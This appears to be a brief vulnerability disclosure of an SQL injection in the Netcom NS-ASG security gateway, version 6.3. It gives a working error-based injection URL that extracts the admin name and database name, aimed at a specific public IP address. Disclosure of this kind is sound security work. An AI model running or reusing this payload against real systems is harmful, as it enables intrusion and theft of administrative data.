Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3

Vulnerability Path ：/admin/config_ISCGroupNoCache.php


https://1.85.53.53/admin/config_ISCGroupNoCache.php?GroupId=1%20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(adminname,%200x7e,%20database())%20from%20Admin%20limit%201)))

<img width="601" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/cbd93745-98fe-4ade-8195-488300280c3c">
